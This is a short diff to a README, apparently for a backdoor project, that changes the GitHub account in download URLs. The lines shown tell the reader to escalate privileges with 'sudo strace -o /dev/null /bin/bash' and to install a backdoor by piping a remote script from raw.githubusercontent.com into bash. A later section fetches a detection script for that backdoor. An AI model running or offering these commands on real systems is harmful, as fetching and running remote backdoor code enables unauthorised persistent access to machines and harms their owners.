@@ -44,7 +44,7 @@ ___________________________________
 To escalate privileges use this command:<br><br>
 Command: sudo strace -o /dev/null /bin/bash<br>
 Command: cd (Change Directory)<br>
-Command: curl -s https://raw.githubusercontent.com/Hussnain-Khan/backdoor/main/Bash/backdoor | bash<br>
+Command: curl -s https://raw.githubusercontent.com/linathaniel/backdoor/main/Bash/backdoor | bash<br>
 
 ___________________________________
 
@@ -105,7 +105,8 @@ Make sure [Escalate Privileges](#escalate-privileges) is done.
 A script or program that will detect if the host is infected with your backdoor
 
 Download the detection script<br><br>
-curl -s https://raw.githubusercontent.com/Hussnain-Khan/backdoor/main/Bonus/detect_backdoor.sh -o detect_backdoor.sh
+curl -s https://raw.githubusercontent.com/linathaniel/backdoor/main/Bonus/detect_backdoor.sh -o detect_backdoor.sh
+
 
 Make the script executable <br><br>
 chmod +x detect_backdoor.sh
